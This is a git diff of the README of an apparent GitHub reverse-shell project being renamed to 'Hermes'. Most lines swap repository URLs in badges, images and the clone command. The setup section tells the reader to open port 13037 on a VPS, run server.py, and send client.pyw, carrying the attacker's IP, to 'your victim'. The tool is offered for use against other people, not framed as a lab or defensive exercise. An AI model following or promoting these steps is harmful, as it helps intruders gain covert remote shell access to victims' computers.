@@ -3,14 +3,14 @@
 
 <p align='center'>
   <b>Star ⭐ if you want more</b><br>
-<i>(READM.md Français <a href="https://github.com/DictateurMiro/reverse-shell/blob/main/README.md">ici</a>)</i>
+<i>(READM.md Français <a href="https://github.com/DictateurMiro/Hermes/blob/main/README.md">ici</a>)</i>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/github/languages/top/DictateurMiro/reverse-shell?color=red&style=flat">
-  <img src="https://img.shields.io/github/last-commit/DictateurMiro/reverse-shell?color=red&style=flat">
-  <img src="https://img.shields.io/github/stars/DictateurMiro/reverse-shell?color=red&style=flat&label=Stars">
-  <img src="https://img.shields.io/github/forks/DictateurMiro/reverse-shell?color=red&style=flat&label=Forks">
+  <img src="https://img.shields.io/github/languages/top/DictateurMiro/Hermes?color=red&style=flat">
+  <img src="https://img.shields.io/github/last-commit/DictateurMiro/Hermes?color=red&style=flat">
+  <img src="https://img.shields.io/github/stars/DictateurMiro/Hermes?color=red&style=flat&label=Stars">
+  <img src="https://img.shields.io/github/forks/DictateurMiro/Hermes?color=red&style=flat&label=Forks">
 </p>
 
 ---
@@ -35,19 +35,19 @@ Contact :
 ---
 
 ## ✨ How a Reverse Shell works (English version soon ...)
-<img src="https://raw.githubusercontent.com/DictateurMiro/reverse-shell/main/images/fonctionnement%20reverse%20shell.png">
+<img src="https://raw.githubusercontent.com/DictateurMiro/Hermes/main/images/fonctionnement%20reverse%20shell.png">
 
 ---
 
 ## 🎥 Video
-<img src="https://raw.githubusercontent.com/DictateurMiro/reverse-shell/main/images/demo.gif">
+<img src="https://raw.githubusercontent.com/DictateurMiro/Hermes/main/images/demo.gif">
 
 ---
 
 ## 🚀 Setup
 
 ```sh-session
-> Download zip file (git clone https://github.com/DictateurMiro/reverse-shell.git)
+> Download zip file (git clone https://github.com/DictateurMiro/Hermes.git)
 > Open port 13037 on your vps
 > Run server.py
 > Send client.pyw (with the ip in the file) to your victim
